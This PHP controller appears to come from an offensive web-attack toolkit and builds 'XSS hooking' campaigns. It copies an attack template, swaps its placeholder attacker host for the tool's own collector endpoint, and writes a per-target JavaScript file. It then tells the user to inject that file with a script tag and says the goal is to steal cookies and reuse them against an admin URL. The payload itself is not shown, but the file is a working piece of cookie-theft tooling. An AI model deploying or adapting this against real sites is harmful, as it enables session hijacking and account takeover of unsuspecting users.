<?php
/**
Purpose: Create XSS Hooking Script

Copyright (c) 2016 ~ alienwithin
Munir Njiru <munir@skilledsoft.com>

@version 1.0.0
@date: 05.04.2016
@url : http://munir.skilledsoft.com
 **/
namespace Controller;
/**
 * Handles Creating a campaign for generating a hooking script
 * @package Controller
 */

class Xssrc extends Mth3l3m3nt
{
    public function beforeroute() {
        $this->response = new \View\Backend();
        $this->response->data['LAYOUT'] = 'ctdb_layout.html';
    }

    /**
     * @param \Base $f3
     * Description This function will be used to create the necessary script needed to hook a page.
     */
    function create_campaign(\Base $f3)
    {
        $web = \Web::instance();

        $this->response->data['SUBPART'] = 'xssrc_campaign.html';
        if ($f3->get('VERB') == 'POST') {
            $error = false;
            if ($f3->devoid('POST.targetUrl')) {
                $error = true;
                \Flash::instance()->addMessage('Please enter a Target url to test access once you steal cookies e.g. http://victim.mth3l3m3nt.com/admin', 'warning');
            } else {
                $target_url = $f3->get('POST.targetUrl');
                $c_host = parse_url($target_url, PHP_URL_HOST);
                $template_src = $f3->ROOT . $f3->BASE . '/scripts/attack_temp.mth3l3m3nt';
                $campaign_file = $f3->ROOT . $f3->BASE . '/scripts/' . $c_host . '.js';
                $campaign_address = $f3->SCHEME . "://" . $f3->HOST . $f3->BASE . '/scripts/' . $c_host . '.js';
                $postHome = $f3->SCHEME . "://" . $f3->HOST . $f3->BASE . '/xssr';
                copy($template_src, $campaign_file);
                $unprepped_contents = file_get_contents($campaign_file);
                $unprepped_contents = str_replace("http://attacker.mth3l3m3nt.com/xssr", $postHome, $unprepped_contents);
                $unprepped_contents = str_replace("http://victim.mth3l3m3nt.com/admin/", $target_url, $unprepped_contents);
                file_put_contents($campaign_file, $unprepped_contents);
                $instructions = \Flash::instance()->addMessage('Attach the script to target e.g. <script src="' . $campaign_address . '"></script>', 'success');
                $this->response->data['content'] = $instructions;
            }
        }

    }
}

